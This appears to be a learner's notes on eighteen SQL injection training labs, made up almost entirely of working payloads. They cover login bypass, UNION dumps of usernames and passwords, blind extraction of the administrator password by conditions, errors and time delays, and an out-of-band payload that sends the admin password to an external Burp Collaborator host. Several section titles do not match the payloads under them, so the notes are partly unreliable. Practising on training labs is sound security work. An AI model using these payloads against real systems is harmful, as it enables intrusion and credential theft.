# Set 1: SQLi
## Lab 1: Retrieval of hidden data
- End goal: display all products both released and unreleased.
- used ' or 1=1 --
## Lab 2: Allowing login bypass
- End Goal: perform SQLi attack and log in as the administrator user.
- username='administrator'--' and password='admin'
## Lab 3: Quering database type and version on Oracle
- End Goal - display the database version string
- ' order by 3 -- -> internal server error
- ' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
- ' UNION SELECT banner, NULL from v$version--
- SELECT banner FROM v$version
## Lab 4: Quering database type and version on MySQL and Microsoft
- End Goal - display the database version
- ' order by 3# -> internal server error
- ' UNION SELECT 'a', 'a'#
- ' UNION SELECT @@version, NULL#
SELECT @@version 
## Lab 5: Listing database contents on non-Oracle databases
- End Goals - Login as the administrator user
- ' order by 3-- -> Internal server error
- ' UNION select 'a', 'a'-- -> both columns accept type text
- ' UNION SELECT version(), NULL-- -> 200 OK  PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)
- ' UNION SELECT table_name, NULL FROM information_schema.tables--
- ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm'--
## Lab 6: Listing database contents on Oracle
- End Goals - Login as the administrator user 
- ' order by 3-- -> internal server error
- ' UNION select 'a', 'a' from DUAL--
- ' UNION SELECT table_name, NULL FROM all_tables--
- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JYPOMG'-- 
- ' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--
## Lab 7: UNION attack, determining the number of columns returned by the query
- End Goal: determine the number of columns returned by the query. 
- select ? from table1 UNION select NULL -error -> incorrect number of columns
- select ? from table1 UNION select NULL, NULL, NULL -200 response code -> correct number of columns
## Lab 8: UNION attack, finding a column containing text
- End Goal: determine the number of columns returned by the query. 
- ' UNION select NULL, 'a', NULL--
## Lab 9: UNION attack, retrieving data from other tables
- End Goal - Output the usernames and passwords in the users table and login as the administrator user.
- ' order by 3-- -> internal server error
- ' UNION select 'a', 'a'-- -> both columns are of data type string
- ' UNION select username, password from users--
## Lab 10: UNION attack, retrieving multiple values in a single column
- End Goal: retrieve all usernames and passwords and login as the administrator user.
- ' order by 3-- -> internal server error
- ' UNION select NULL, password from users--
- ' UNION select NULL, version()-- -> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit
- ' UNION select NULL, username || '*' || password from users--
## Lab 11: Blind SQL injection with conditional responses
- End Goals - Output the password of the administrator
- select tracking-id from tracking-table where trackingId = '' and (select 'x' from users LIMIT 1)='x'--'
- select tracking-id from tracking-table where trackingId = '' and (select username from users where username='administrator')='administrator'--'
- select tracking-id from tracking-table where trackingId = '' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
- select tracking-id from tracking-table where trackingId = '' and (select substring(password,2,1) from users where username='administrator')='a'--'
## Lab 12: Blind SQL injection with conditional errors
- End Goals - Output the administrator password
-  || (select '' from dual) ||  -> oracle database
-  || (select '' from users where username='administrator') || 
-  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||  -> Internal server error -> administrator user exists
-  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || -> 200 response at 50 -> length of password is less than 50 -> 20 characters
-  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || -> w is not the first character of the password
## Lab 13: Visible error-based SQL injection
- End Goal - to prove that the field is vulnerable to blind SQLi (time based)
- ' || (SELECT pg_sleep(10))--
## Lab 14: Blind SQL injection with time delays
- End Goals - Exploit time-based blind SQLi to output the administrator password
- ' || pg_sleep(10)--
- ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
- ' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)-- -> length of password is 20 characters
- ' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
## Lab 15: Blind SQL injection with time delays and information retrieval
- End Goal - Exploit SQLi and cause a DNS lookup
- ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
## Lab 16: Blind SQL injection with out-of-band interaction
- End Goals - Exploit SQLi to output the password of the administrator user
- ' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
## Lab 17: Blind SQL injection with out-of-band data exfiltration
- End Goal - Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
- 1 UNION SELECT username || '~'  || password  FROM users
## Lab 18: SQL injection with filter bypass via XML encoding
- End Goal - Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.
- ' AND 1=CAST((SELECT password from users LIMIT 1) as int)--